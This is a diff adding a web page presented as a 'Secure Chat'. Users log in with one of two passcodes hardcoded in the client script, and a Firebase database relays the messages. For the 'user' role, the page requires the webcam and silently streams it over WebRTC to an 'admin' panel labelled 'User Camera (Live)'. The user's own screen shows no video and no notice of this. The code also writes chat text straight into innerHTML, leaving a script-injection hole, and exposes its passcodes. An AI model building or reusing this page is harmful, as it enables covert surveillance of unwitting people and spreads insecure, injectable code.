@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chat Interface</title>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    :root {
+      --primary: #25D366;
+      --bg-color: #ECE5DD;
+      --chat-bg: #e5ddd5;
+      --msg-sent: #dcf8c6;
+      --msg-recv: #ffffff;
+    }
+    body { margin: 0; font-family: sans-serif; background-color: var(--bg-color); display: flex; flex-direction: column; height: 100vh; }
+    
+    #login-screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
+    #login-screen input { padding: 10px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; }
+    #login-screen button { padding: 10px 20px; font-size: 16px; background-color: var(--primary); color: white; border: none; border-radius: 5px; cursor: pointer; }
+    
+    #app-container { display: none; flex-direction: row; height: 100vh; width: 100%; }
+    
+    #chat-section { flex: 1; display: flex; flex-direction: column; background: var(--chat-bg); max-width: 100%; transition: all 0.3s; }
+    #chat-header { background: #075E54; color: white; padding: 15px; font-weight: bold; font-size: 18px; }
+    #chat-box { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+    .msg { max-width: 60%; padding: 10px 15px; border-radius: 15px; position: relative; word-wrap: break-word; font-size: 15px; }
+    .msg.sent { background-color: var(--msg-sent); align-self: flex-end; border-top-right-radius: 0; }
+    .msg.recv { background-color: var(--msg-recv); align-self: flex-start; border-top-left-radius: 0; }
+    .sender-name { font-size: 11px; color: #888; margin-bottom: 4px; display: block; }
+    
+    #input-area { display: flex; padding: 10px; background: #f0f0f0; }
+    #msg-input { flex: 1; padding: 12px; border-radius: 20px; border: none; outline: none; font-size: 15px; }
+    #send-btn { background: var(--primary); border: none; color: white; padding: 10px 20px; margin-left: 10px; border-radius: 20px; cursor: pointer; font-weight: bold; }
+
+    #video-section { display: none; width: 350px; background: #000; border-left: 2px solid #ccc; position: relative; }
+    video { width: 100%; height: 100%; object-fit: cover; }
+    #video-overlay { position: absolute; bottom: 10px; left: 10px; color: white; background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 5px; font-size: 12px;}
+
+    @media (max-width: 768px) {
+      #app-container { flex-direction: column; }
+      #video-section { width: 100%; height: 30vh; border-left: none; border-bottom: 2px solid #ccc; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="login-screen">
+    <h2>Enter Passcode</h2>
+    <input type="password" id="passcode" placeholder="Passcode">
+    <button onclick="login()">Enter Chat</button>
+  </div>
+
+  <div id="app-container">
+    <div id="chat-section">
+      <div id="chat-header">Secure Chat</div>
+      <div id="chat-box"></div>
+      <div id="input-area">
+        <input type="text" id="msg-input" placeholder="Type a message..." onkeypress="if(event.key==='Enter') sendMessage()">
+        <button id="send-btn" onclick="sendMessage()">Send</button>
+      </div>
+    </div>
+    
+    <div id="video-section">
+      <video id="remoteVideo" autoplay playsinline></video>
+      <div id="video-overlay">User Camera (Live)</div>
+    </div>
+  </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDXCUqTvb6ZY5nX4zPpun3T_SpytIMjORw",
+      authDomain: "chat-f0a63.firebaseapp.com",
+      projectId: "chat-f0a63",
+      storageBucket: "chat-f0a63.firebasestorage.app",
+      messagingSenderId: "1050545799008",
+      appId: "1:1050545799008:web:34377d4091305fe3072805",
+      measurementId: "G-J3WJQNSVZX",
+      databaseURL: "https://chat-f0a63-default-rtdb.firebaseio.com"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let role = null; 
+    let username = "";
+    
+    const configuration = { 'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}] };
+    let peerConnection;
+    let localStream;
+
+    function login() {
+      const code = document.getElementById('passcode').value;
+      if (code === 'Smith2129') {
+        role = 'admin';
+        username = 'Admin';
+        document.getElementById('video-section').style.display = 'block'; 
+        startApp();
+      } else if (code === '0508') {
+        role = 'user';
+        username = 'User';
+        startApp();
+      } else {
+        alert("Invalid passcode.");
+      }
+    }
+
+    async function startApp() {
+      document.getElementById('login-screen').style.display = 'none';
+      document.getElementById('app-container').style.display = 'flex';
+      
+      initChat();
+
+      if (role === 'user') {
+        await startUserCamera();
+      } else if (role === 'admin') {
+        initAdminWebRTC();
+      }
+    }
+
+    function initChat() {
+      db.ref('messages').on('child_added', snapshot => {
+        const data = snapshot.val();
+        displayMessage(data.sender, data.text);
+      });
+    }
+
+    function sendMessage() {
+      const input = document.getElementById('msg-input');
+      const text = input.value.trim();
+      if (text) {
+        db.ref('messages').push({ sender: username, text: text, timestamp: Date.now() });
+        input.value = '';
+      }
+    }
+
+    function displayMessage(sender, text) {
+      const chatBox = document.getElementById('chat-box');
+      const div = document.createElement('div');
+      div.className = 'msg ' + (sender === username ? 'sent' : 'recv');
+      div.innerHTML = `<span class="sender-name">${sender}</span>${text}`;
+      chatBox.appendChild(div);
+      chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    async function startUserCamera() {
+      try {
+        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); 
+        peerConnection = new RTCPeerConnection(configuration);
+        
+        localStream.getTracks().forEach(track => {
+          peerConnection.addTrack(track, localStream);
+        });
+
+        peerConnection.onicecandidate = event => {
+          if (event.candidate) {
+            db.ref('signaling/iceCandidates/user').push(event.candidate.toJSON());
+          }
+        };
+
+        const offer = await peerConnection.createOffer();
+        await peerConnection.setLocalDescription(offer);
+        db.ref('signaling/offer').set({ type: offer.type, sdp: offer.sdp });
+
+        db.ref('signaling/answer').on('value', async snapshot => {
+          const answer = snapshot.val();
+          if (answer && !peerConnection.currentRemoteDescription) {
+            const rtcAnswer = new RTCSessionDescription(answer);
+            await peerConnection.setRemoteDescription(rtcAnswer);
+          }
+        });
+
+        db.ref('signaling/iceCandidates/admin').on('child_added', snapshot => {
+          const candidate = new RTCIceCandidate(snapshot.val());
+          peerConnection.addIceCandidate(candidate);
+        });
+
+      } catch (e) {
+        console.error("Camera access denied or error:", e);
+        alert("Camera access is required for this chat. Please ensure permissions are granted.");
+      }
+    }
+
+    async function initAdminWebRTC() {
+      peerConnection = new RTCPeerConnection(configuration);
+
+      peerConnection.ontrack = event => {
+        const remoteVideo = document.getElementById('remoteVideo');
+        if (remoteVideo.srcObject !== event.streams[0]) {
+          remoteVideo.srcObject = event.streams[0];
+        }
+      };
+
+      peerConnection.onicecandidate = event => {
+        if (event.candidate) {
+          db.ref('signaling/iceCandidates/admin').push(event.candidate.toJSON());
+        }
+      };
+
+      db.ref('signaling/offer').on('value', async snapshot => {
+        const offer = snapshot.val();
+        if (offer && !peerConnection.currentRemoteDescription) {
+          await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+          
+          const answer = await peerConnection.createAnswer();
+          await peerConnection.setLocalDescription(answer);
+          db.ref('signaling/answer').set({ type: answer.type, sdp: answer.sdp });
+        }
+      });
+
+      db.ref('signaling/iceCandidates/user').on('child_added', snapshot => {
+        const candidate = new RTCIceCandidate(snapshot.val());
+        peerConnection.addIceCandidate(candidate);
+      });
+      
+      db.ref('signaling').remove();
+    }
+  </script>
+</body>
+</html>
